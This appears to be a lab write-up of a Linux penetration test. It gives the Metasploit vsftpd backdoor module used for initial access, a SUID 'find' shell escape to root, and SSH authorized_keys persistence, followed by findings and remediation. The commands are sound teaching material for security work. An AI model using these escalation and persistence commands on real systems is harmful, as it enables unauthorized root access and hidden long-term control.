# Privilege Escalation and Persistence Lab

## Overview

This project demonstrates privilege escalation and persistence techniques performed within a controlled lab environment using Metasploit Framework and Linux privilege escalation methods. The assessment focused on obtaining initial access, identifying privilege escalation vectors, gaining elevated privileges, and establishing persistence mechanisms for continued system access.

---

# Tools Used

* Kali Linux
* Metasploit Framework
* Linux Command Line Utilities
* SSH
* Netcat

---

# Objectives

* Gain initial shell access on the target system
* Enumerate privilege escalation vectors
* Escalate privileges to root level
* Establish persistence on compromised systems
* Document post-exploitation activities

---

# Lab Environment

| Machine    | Role     | IP Address    |
| ---------- | -------- | ------------- |
| Kali Linux | Attacker | 192.168.33.128 |
| Target VM  | Victim   | 192.168.34.129 |

---

# Initial Access

## Description

Initial access to the target machine was obtained using Metasploit Framework against a vulnerable network service.

---

## Exploit Used

```bash id="x7m2v5"
exploit/unix/ftp/vsftpd_234_backdoor
```

---

## Result

A remote shell session was successfully established on the target system with limited user privileges.

---

# Privilege Enumeration

## Description

Post-exploitation enumeration was performed to identify potential privilege escalation vectors and insecure system configurations.

---

## Enumeration Commands

```bash id="k4v9m1"
whoami
id
hostname
```

---

## SUID Enumeration

```bash id="u8m3x7"
find / -perm -4000 2>/dev/null
```

---

## Result

Multiple SUID-enabled binaries were identified during enumeration. Misconfigured binaries provided an opportunity for privilege escalation.

---

# Privilege Escalation

## Description

Privilege escalation was achieved through exploitation of an insecure SUID binary configuration.

---

## Exploitation Command

```bash id="q5m1v8"
find . -exec /bin/sh -p \; -quit
```

---

## Result

Root-level shell access was successfully obtained on the target machine.

---

# Persistence

## Description

Persistence was established by adding an SSH public key to the target system's authorized keys configuration.

---

## SSH Key Generation

```bash id="p9x4m2"
ssh-keygen
```

---

## Persistence Setup

```bash id="r6k1v5"
echo "<PUBLIC_KEY>" >> ~/.ssh/authorized_keys
```

---

## Result

Persistent remote access was established, allowing future authentication without requiring passwords.

---

# Findings

| Finding ID | Vulnerability             | Severity | Impact                        |
| ---------- | ------------------------- | -------- | ----------------------------- |
| PE-001     | Misconfigured SUID Binary | Critical | Root Privilege Escalation     |
| PE-002     | Weak Persistence Controls | High     | Unauthorized Long-Term Access |

---

# Impact

Successful privilege escalation allowed full administrative control over the target system. Persistence mechanisms enabled continued unauthorized access, increasing the risk of data compromise, lateral movement, and long-term system abuse.

---

# Remediation

* Remove unnecessary SUID permissions
* Apply least privilege principles
* Monitor unauthorized SSH key additions
* Restrict access to sensitive binaries
* Perform regular privilege audits
* Implement endpoint monitoring and logging

---

# Summary

The privilege escalation assessment demonstrated how insecure system configurations and improper permission management can lead to complete system compromise. Through post-exploitation enumeration, privilege escalation techniques, and persistence establishment, the assessment highlighted the importance of secure privilege management and continuous monitoring within Linux environments.

---

# Disclaimer

This project was conducted within an isolated lab environment for educational and authorized security testing purposes only.
